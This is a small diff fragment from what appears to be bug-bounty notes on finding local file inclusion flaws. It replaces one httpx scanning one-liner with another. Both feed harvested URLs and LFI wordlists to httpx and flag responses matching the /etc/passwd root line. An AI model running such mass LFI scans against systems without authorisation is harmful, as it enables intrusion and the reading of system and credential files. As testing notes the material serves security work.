@@ -441,7 +441,7 @@ ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-etc-files-of-all-linux-pac
 ```
 
 ```bash
-cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  uro | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"****
+httpx -l wayback-best-filtered-uro.txt  -silent -path  /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt  -threads 20 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"*
 ```
 
 files we are intersted to see
